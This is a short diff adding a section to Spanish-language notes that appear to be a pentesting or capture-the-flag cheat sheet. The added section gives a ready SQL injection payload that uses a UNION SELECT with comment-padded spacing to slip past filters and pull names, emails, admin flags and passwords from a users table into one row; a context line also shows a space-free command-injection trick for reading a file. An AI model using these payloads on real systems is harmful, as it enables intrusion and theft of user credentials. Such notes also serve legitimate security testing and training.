@@ -4495,6 +4495,13 @@ Para esto usa
 {cat,file.txt}
 ``` 
 
+## Saca en una sola fila todo con CONCAT
+
+Saca en una sola fila todo
+
+```
+')/**/UNION/**/SELECT/**/1,2,concat(name,':',email,':',admin,':',password,':',genres),4,5/**/from/**/users#
+```
 
 # Referencias
 
